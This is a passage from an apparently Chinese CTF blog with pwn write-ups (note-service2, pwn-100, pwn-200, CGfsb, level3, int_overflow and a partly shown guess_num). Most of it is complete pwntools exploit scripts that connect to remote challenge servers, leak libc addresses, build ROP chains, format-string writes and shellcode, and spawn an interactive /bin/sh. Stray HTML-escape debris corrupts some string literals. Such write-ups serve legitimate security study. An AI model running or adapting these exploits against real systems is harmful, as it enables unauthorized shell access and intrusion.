class="line"><span class="comment">#encodeing:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)  </span><br><span class="line">p = remote(<span class="string">&quot;124.126.19.106&quot;</span>,<span class="number">41618</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./note-service2&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system</span></span><br><span class="line">code0 = (asm(<span class="string">&#x27;xor rax,rax&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code1= (asm(<span class="string">&#x27;mov eax,0x3B&#x27;</span>) + <span class="string">&#x27;\xeb\x19&#x27;</span>)  </span><br><span class="line">code2 = (asm(<span class="string">&#x27;xor rsi,rsi&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>)  </span><br><span class="line">code3 = (asm(<span class="string">&#x27;xor rdx,rdx&#x27;</span>) + <span class="string">&#x27;\x90\x90\xeb\x19&#x27;</span>) </span><br><span class="line">code4 = (asm(<span class="string">&#x27;syscall&#x27;</span>).ljust(<span class="number">7</span>,<span class="string">&#x27;\x90&#x27;</span>))  </span><br><span class="line"></span><br><span class="line"><span class="comment">#system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">shellcode0 = <span class="string">&quot;\x01\x30\x8f\xe2&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode1 = <span class="string">&quot;\x13\xff\x2f\xe1&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode2 = <span class="string">&quot;\x78\x46\x0e\x30&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode3 = <span class="string">&quot;\x01\x90\x49\x1a&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode4 = <span class="string">&quot;\x92\x1a\x08\x27&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode5 = <span class="string">&quot;\xc2\x51\x03\x37&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode6 = <span class="string">&quot;\x01\xdf\x2f\x62&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode7 = <span class="string">&quot;\x69\x6e\x2f\x2f&quot;</span> + <span class="string">&#x27;\x90\xeb\x19&#x27;</span></span><br><span class="line">shellcode8 = <span class="string">&quot;\x73\x68&quot;</span> + <span class="string">&#x27;\x90\x90\x90\x90\x90&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#write shellcode </span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">8</span>,code1)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,code2)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">8</span>,code3)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,code4)</span><br><span class="line"></span><br><span class="line"><span class="comment">#overwrite atoi@got.plt</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(-<span class="number">8</span>,<span class="number">8</span>,code0)</span><br><span class="line"></span><br><span class="line"><span class="comment">#send /bin/sh</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;your choice&gt;&gt; &quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="pwn-100"><a href="#pwn-100" class="headerlink" title="pwn-100"></a>pwn-100</h3><p>[collapse title=”展开查看详情” status=”false”]<br><strong>考点：栈溢出、ROP</strong></p><p>这个栈溢出每次固定要求输入 200 个字符，也没有别的了。</p><p>ROP 操作也不需要往 bss 写入 /bin/sh ，直接在 libc 找一个就好了。（看到网上有这样的操作orz）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;124.126.19.106&#x27;</span>,<span class="number">35604</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn-100&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn-100&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400763</span></span><br><span class="line">start_addr = <span class="number">0x400550</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak puts@got.plt</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc</span></span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">binsh_addr = libc_base + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#call system(&#x27;/bin/sh&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="pwn-200"><a href="#pwn-200" class="headerlink" title="pwn-200"></a>pwn-200</h3><p>[collapse title=”展开查看详情” status=”false”]<strong>考点：栈溢出、泄露地址</strong></p><p>漏洞函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">sub_8048484</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+1Ch] [ebp-6Ch]</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, &amp;buf);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可操作空间空间很长就不需要什么骚操作了。就是没给 libc 文件，需要去<a href="https://libc.blukat.me/">libc database</a> 查一下而已。查到的话是这个：libc6-i386_2.23-0ubuntu11_amd64.so</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;159.138.137.79&quot;</span>,<span class="number">55989</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc6-i386_2.23-0ubuntu11_amd64.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = <span class="number">0x080483D0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(write_plt) + p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">write_leak = u32(p.recvuntil(<span class="string">&quot;Welcome&quot;</span>,drop=<span class="number">1</span>))</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = libc_base + libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.success(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x6c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system) + p32(main_addr) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>考点：写入小数字格式化字符串</p><p>完整 exp ：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">59528</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./CGfsb&quot;)</span></span><br><span class="line"></span><br><span class="line">pwnme = <span class="number">0x0804A068</span></span><br><span class="line">payload = <span class="string">&quot;%8c%12$n&quot;</span> + p32(pwnme)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x8</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;please&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>考点：栈溢出、ROP（ret2libc）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">vulnerable_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Input:\n&quot;</span>, <span class="number">7u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;amp;buf, <span class="number">0x100</span>u);<span class="comment">//溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打开了 NX 保护栈数据不可执行，程序没有预留后门。解决办法就是 ret2libc ，这种方法在《蒸米一步一步学ROP》中有详细讲解。<br>第一次执行是用于泄露 libc 地址；第二次调用 system 完成 ret2libc。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcSearch <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;111.198.29.45&quot;</span>,<span class="number">43333</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./level3&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc_32.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">main_addr = elf.symbols[<span class="string">&#x27;;main&#x27;</span>;]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(write_plt)+p32(main_addr)</span><br><span class="line">payload += p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Input:\n&quot;</span>,payload)</span><br><span class="line">write_leak = u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line">log.success(<span class="string">&quot;write_leak:&quot;</span>+<span class="built_in">hex</span>(write_leak))</span><br><span class="line">libc_base = write_leak - libc.symbols[<span class="string">&#x27;;write&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;;system&#x27;</span>;]</span><br><span class="line">log.success(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">binsh_addr = libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>() + libc_base</span><br><span class="line">log.success(<span class="string">&quot;binsh_addr:&quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x88</span>+<span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line">payload += p32(binsh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p>栈溢出。位置在 check_passwd strcpy ，s 最大长度为 0x199 。不能直接进行溢出，有检查 s 长度的函数，设想是限定在 4~8 。重点在于 s 的长度存储变量使用的是 unsigned int 类型，也就是最大长度为 255 （2的8次方-1）。</p><p>要绕过这个限制才能溢出控制 eip 。绕过方法很简单，这个变量存储单元是 8 位，如果长度为 256 的话，程序就认为长度为 0 。因为 256 的二进制是 0b100000000 ，低八位为 0b00000000 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *__cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [esp+Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &amp;lt;= <span class="number">3u</span> || v3 &amp;gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid Password&quot;</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;amp;dest, s);<span class="comment">//溢出</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;;debug&#x27;</span>;</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;;111.198.29.45&#x27;</span>;,<span class="number">30389</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./int&quot;)</span></span><br><span class="line">what_is_this = <span class="number">0x0804868B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x14</span></span><br><span class="line">payload += <span class="string">&#x27;;a&#x27;</span>;*<span class="number">0x4</span></span><br><span class="line">payload += p32(what_is_this)</span><br><span class="line">payload = payload.ljust(<span class="number">256</span>+<span class="number">6</span>,<span class="string">&#x27;;b&#x27;</span>;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;choice:&#x27;</span>;,<span class="string">&#x27;;1&#x27;</span>;)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;;username:&#x27;</span>;,<span class="string">&#x27;;author_skye&#x27;</span>;)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;;passwd:&#x27;</span>;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h3 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h3><p>[collapse title=”展开查看详情” status=”false”]</p><p><strong>考察点：利用栈溢出固定随机数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  *(_QWORD *)seed = sub_BB0();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to a guess number game!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;-------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please let me know your name!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your name:&quot;</span>, <span class="number">0LL</span>);</span><br><span class="line">  gets((__int64)&amp;amp;v7);<span class="comment">//栈溢出</span></span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &amp;lt;= <span class="number">9</span>; ++i )                    <span class="comment">// 连续正确10次</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------Turn:%d-------------\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input your guess number:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;amp;v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;---------------------------------&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 != v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;GG!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于题目开启 Canary 